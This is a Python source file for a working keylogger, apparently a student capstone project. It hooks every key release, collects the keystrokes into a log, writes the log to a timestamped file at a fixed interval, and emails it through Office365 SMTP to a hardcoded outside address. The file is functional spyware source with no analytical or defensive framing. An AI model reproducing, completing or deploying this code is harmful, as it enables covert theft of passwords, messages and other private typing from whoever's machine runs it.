from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from logging import exception
import keyboard
from email.mime.text import MIMEText
import smtplib 
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 
EMAIL_ADDRESS = "youremail@outlook.com"
EMAIL_PASSWORD = "yourpasswordhere"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f) 
        print(f"[+] Saved {self.filename}.txt")
        self.sendmail_file(EMAIL_ADDRESS, EMAIL_PASSWORD, self.filename)

    def sendmail_file(self, email, password, attachment):
        envelope = MIMEMultipart()
        envelope['Subject']  = f'Log {datetime.now()}'
        envelope['From'] = email
        envelope['To'] = 'mhcapstone22@outlook.com'
        with open(attachment+'.txt', 'rb')as f:
            attach = MIMEApplication(f.read(),Name = attachment+'.txt')
        attach['Content-Disposition'] = 'attachment; filename="%s"' % attachment
        envelope.attach(attach)
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        try:
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, envelope.as_string())
            server.quit()
        except Exception:
            print('send_mail_error', Exception)    

    def sendmail(self, email, password, message):
        envelope = MIMEText(message)
        envelope['Subject']  = f'Log {datetime.now()}'
        envelope['From'] = email
        envelope['To'] = 'mhcapstone22@outlook.com'
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        try:
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, envelope.as_string())
            server.quit()
        except Exception:
            print('send_mail_error', Exception)    


    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True

        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()